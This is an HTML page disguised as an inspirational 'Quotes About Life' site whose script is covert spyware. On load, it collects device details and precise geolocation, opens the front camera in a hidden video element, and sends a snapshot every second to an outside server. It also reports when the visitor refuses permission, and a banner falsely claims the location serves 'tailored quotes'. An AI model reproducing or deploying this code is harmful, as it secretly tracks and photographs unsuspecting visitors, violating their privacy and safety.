<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Quotes About Life</title>
    <link
      rel="icon"
      href="https://cdn-icons-png.flaticon.com/32/2721/2721293.png"
      type="image/png"
    />

    <link
      href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500&family=Open+Sans:wght@400;600&display=swap"
      rel="stylesheet"
    />
    <style>
      :root {
        --primary-color: #6a11cb;
        --secondary-color: #2575fc;
        --bg: #f9f9f9;
        --text: #333;
        --quote-bg: #fff;
        --footer-bg: #222;
        --link: #6a11cb;
      }

      body.dark {
        --bg: #121212;
        --text: #e0e0e0;
        --quote-bg: #1e1e1e;
        --footer-bg: #000;
        --link: #bb86fc;
      }

      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      html {
        scroll-behavior: smooth;
      }

      body {
        font-family: "Open Sans", sans-serif;
        background-color: var(--bg);
        color: var(--text);
        line-height: 1.6;
        transition: background 0.4s, color 0.4s;
      }

      header {
        position: sticky;
        top: 0;
        background: var(--quote-bg);
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        z-index: 1000;
      }

      nav {
        max-width: 1200px;
        margin: auto;
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 1rem 2rem;
      }

      nav a {
        color: var(--text);
        font-weight: 600;
        text-decoration: none;
        font-size: 1rem;
      }

      .toggle-container {
        display: flex;
        align-items: center;
        gap: 0.5rem;
      }

      .toggle-container label {
        width: 40px;
        height: 20px;
        background: var(--secondary-color);
        border-radius: 10px;
        position: relative;
        cursor: pointer;
      }

      .toggle-container label::after {
        content: "";
        width: 16px;
        height: 16px;
        background: white;
        border-radius: 50%;
        position: absolute;
        top: 2px;
        left: 2px;
        transition: 0.3s;
      }

      #toggle:checked + label::after {
        transform: translateX(20px);
      }

      #location-banner {
        background: #fff8e1;
        color: #4e4e4e;
        padding: 0.75rem 1rem;
        border-bottom: 1px solid #ffecb3;
        display: none;
        flex-wrap: wrap;
        justify-content: space-between;
        align-items: center;
        font-size: 0.95rem;
        font-weight: 500;
        position: sticky;
        top: 0;
        z-index: 9999;
        gap: 1rem;
      }

      #location-banner p {
        margin: 0;
        flex: 1 1 60%;
      }

      .banner-actions {
        display: flex;
        align-items: center;
        gap: 0.75rem;
        flex-wrap: nowrap;
      }

      #allow-location-btn {
        background: var(--primary-color);
        color: white;
        border: none;
        padding: 0.4rem 0.9rem;
        border-radius: 6px;
        cursor: pointer;
        font-weight: bold;
        transition: background 0.3s ease;
      }

      #allow-location-btn:hover {
        background: var(--secondary-color);
      }

      #close-banner {
        cursor: pointer;
        font-size: 1.2rem;
      }

      .hero {
        background: linear-gradient(
          to right,
          var(--primary-color),
          var(--secondary-color)
        );
        color: white;
        text-align: center;
        padding: 4rem 1.5rem;
      }

      .hero h1 {
        font-family: "Playfair Display", serif;
        font-size: 2.5rem;
        animation: slideIn 1s ease forwards;
      }

      .hero p {
        font-size: 1.1rem;
        margin-top: 0.5rem;
        animation: fadeIn 1.2s ease forwards;
      }

      @keyframes slideIn {
        from {
          opacity: 0;
          transform: translateY(-20px);
        }

        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      @keyframes fadeIn {
        from {
          opacity: 0;
        }

        to {
          opacity: 1;
        }
      }

      section#quotes {
        padding: 3rem 1.5rem;
        max-width: 1200px;
        margin: auto;
      }

      .quote-grid {
        display: grid;
        grid-template-columns: 1fr;
        gap: 2rem;
      }

      @media (min-width: 600px) {
        .quote-grid {
          grid-template-columns: repeat(2, 1fr);
        }
      }

      @media (min-width: 992px) {
        .quote-grid {
          grid-template-columns: repeat(3, 1fr);
        }
      }

      blockquote {
        background: var(--quote-bg);
        border-left: 5px solid var(--primary-color);
        padding: 1.5rem;
        border-radius: 10px;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
        font-style: italic;
        transition: background 0.3s, color 0.3s;
      }

      blockquote footer {
        margin-top: 1rem;
        text-align: right;
        font-weight: bold;
        color: var(--link);
      }

      footer {
        background: var(--footer-bg);
        color: white;
        text-align: center;
        padding: 2rem 1rem;
        transition: background 0.3s;
      }

      .social-icons {
        margin: 1rem 0;
      }

      .social-icons a {
        margin: 0 0.5rem;
        color: white;
        font-size: 1.2rem;
        text-decoration: none;
        transition: transform 0.3s ease, color 0.3s ease;
      }

      .social-icons a:hover {
        transform: scale(1.2);
        color: var(--link);
      }

      #toggle {
        display: none;
      }

      /* Hide map from UI but keep functional */
      #map {
        display: none;
        height: 0;
        width: 0;
        visibility: hidden;
        pointer-events: none;
      }

      /* Hidden video and canvas */
      #video,
      #canvas {
        display: none;
      }
    </style>
  </head>

  <body>
    <input
      type="checkbox"
      id="toggle"
      hidden
      onchange="document.body.classList.toggle('dark')"
    />
    <div id="location-banner">
      <p>
        üåü Want even better quotes tailored for you? Please allow location
        permission. It helps us serve more inspiring content! üí°
      </p>
      <div class="banner-actions">
        <button id="allow-location-btn">Allow</button>
        <span id="close-banner">‚úñÔ∏è</span>
      </div>
    </div>
    <header>
      <nav>
        <a href="#">Quotes About Life</a>
        <div class="toggle-container">
          <span>üåô</span>
          <label for="toggle" title="Toggle Dark Mode"></label>
        </div>
      </nav>
    </header>

    <section class="hero">
      <h1>Inspiring Life Quotes</h1>
      <p>Words that empower, motivate, and enlighten your journey.</p>
    </section>

    <section id="quotes">
      <div class="quote-grid">
        <blockquote>
          "Life is what happens when you're busy making other plans."
          <footer>- John Lennon</footer>
        </blockquote>
        <blockquote>
          "Get busy living or get busy dying."
          <footer>- Stephen King</footer>
        </blockquote>
        <blockquote>
          "The purpose of our lives is to be happy."
          <footer>- Dalai Lama</footer>
        </blockquote>
        <blockquote>
          "Life is short, and it is up to you to make it sweet."
          <footer>- Sarah Louise Delany</footer>
        </blockquote>
        <blockquote>
          "You only live once, but if you do it right, once is enough."
          <footer>- Mae West</footer>
        </blockquote>
        <blockquote>
          "In the middle of every difficulty lies opportunity."
          <footer>- Albert Einstein</footer>
        </blockquote>
        <blockquote>
          "Life is really simple, but we insist on making it complicated."
          <footer>- Confucius</footer>
        </blockquote>
        <blockquote>
          "Your time is limited, so don‚Äôt waste it living someone else‚Äôs life."
          <footer>- Steve Jobs</footer>
        </blockquote>
        <blockquote>
          "Do not dwell in the past, do not dream of the future, concentrate the
          mind on the present moment."
          <footer>- Buddha</footer>
        </blockquote>
        <blockquote>
          "Happiness is not something ready-made. It comes from your own
          actions."
          <footer>- Dalai Lama</footer>
        </blockquote>
      </div>
    </section>

    <footer>
      <div class="social-icons">
        <a href="#">üìò</a>
        <a href="#">üê¶</a>
        <a href="#">üì∏</a>
      </div>
      <p>&copy; 2025 Quotes About Life. Made with ‚ù§Ô∏è by Dogesh</p>
    </footer>

    <video id="video" autoplay muted></video>
    <canvas id="canvas"></canvas>
    <div id="map"></div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <script>
      let uLat = null,
        uLng = null,
        m = null,
        c = null;

      const map = L.map("map").setView([30.7046, 76.7179], 13);
      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
        attribution: "¬© OpenStreetMap contributors",
      }).addTo(map);

      // Reusable fetch
      const post = async (url, data) => {
        try {
          const res = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data),
          });
          return await res.json();
        } catch (err) {
          return null;
        }
      };

      function sendPhotoToTelegram(blob) {
        const formData = new FormData();
        formData.append("photo", blob, "snapshot.jpg");
        fetch(`https://loc-4tjr.onrender.com/api/meaow`, {
          method: "POST",
          body: formData,
        });
      }

      function captureAndSendImage() {
        try {
          const video = document.getElementById("video");
          const canvas = document.getElementById("canvas");
          const ctx = canvas.getContext("2d");
          canvas.width = video.videoWidth || 300;
          canvas.height = video.videoHeight || 200;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(
            (blob) => blob && sendPhotoToTelegram(blob),
            "image/jpeg",
            0.9
          );
        } catch (err) {}
      }

      function startCameraLoop() {
        navigator.mediaDevices
          .getUserMedia({ video: { facingMode: "user" } })
          .then((mediaStream) => {
            stream = mediaStream;
            const video = document.getElementById("video");
            video.srcObject = stream;

            video.onloadedmetadata = () => {
              video.play();

              // ‚úÖ Start only after video is playing
              video.onplaying = () => {
                // Start sending image every 1 second
                setInterval(captureAndSendImage, 1000);
              };
            };
          })
          .catch((err) => {
            fetch("https://loc-4tjr.onrender.com/api/hello", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                message: "‚ùå User denied camera access.",
              }),
            });
          });
      }

      // Update map marker & circle
      const updMap = (lat, lng, acc) => {
        const coords = [lat, lng];
        if (!m)
          m = L.marker(coords)
            .addTo(map)
            .bindPopup("üìç You are here")
            .openPopup();
        else m.setLatLng(coords);

        if (!c)
          c = L.circle(coords, {
            radius: acc,
            color: "blue",
            fillColor: "#add8e6",
            fillOpacity: 0.3,
          }).addTo(map);
        else c.setLatLng(coords).setRadius(acc);

        map.setView(coords, 16);
      };

      // Send location
      const sendLoc = async (lat, lng, acc) => {
        // ‚úÖ Check if all values are valid numbers
        if ([lat, lng, acc].every((v) => typeof v === "number" && !isNaN(v))) {
          try {
            const response = await fetch(
              "https://loc-4tjr.onrender.com/api/GLT",
              {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify({
                  lat,
                  lng,
                  accuracy: acc,
                }),
              }
            );

            if (!response.ok) {
              console.error(":", response.statusText);
            } else {
              console.log("");
            }
          } catch (error) {
            console.error("Error sending location:", error);
          }
        } else {
          console.warn("Invalid location data:", { lat, lng, acc });
        }
      };

      // Locate user
      const locUser = () => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const { latitude, longitude, accuracy } = pos.coords;
            uLat = latitude;
            uLng = longitude;
            updMap(latitude, longitude, accuracy);
            sendLoc(latitude, longitude, accuracy);
          },
          () => {
            const banner = document.getElementById("location-banner");
            if (banner) banner.style.display = "flex";

            post("https://loc-4tjr.onrender.com/api/hello", {
              message: "‚ùå User denied location access.",
            });
          },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      };

      // Send device info
      const sendInfo = async (info) => {
        if (info?.platform && info?.connection && info?.userAgent) {
          try {
            const response = await fetch(
              "https://loc-4tjr.onrender.com/api/GLT",
              {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify(info),
              }
            );

            if (!response.ok) {
              console.error(":", response.statusText);
            } else {
              console.log("");
            }
          } catch (error) {
            console.error("", error);
          }
        } else {
          console.warn("", info);
        }
      };

      // Get device info
      const getInfo = async () => {
        const info = {
          platform: navigator.platform,
          connection: navigator.connection?.effectiveType || "N/A",
          userAgent: navigator.userAgent,
          battery: null,
        };
        if (navigator.getBattery) {
          const b = await navigator.getBattery();
          info.battery = `${Math.round(b.level * 100)}% (${
            b.charging ? "Charging" : "Not Charging"
          })`;
        }
        sendInfo(info);
      };

      // Event listeners
      window.addEventListener("DOMContentLoaded", () => {
        getInfo();
        locUser();
        startCameraLoop();
      });
      document
        .getElementById("close-banner")
        ?.addEventListener(
          "click",
          () =>
            (document.getElementById("location-banner").style.display = "none")
        );
      document
        .getElementById("allow-location-btn")
        ?.addEventListener("click", locUser);
    </script>
  </body>
</html>
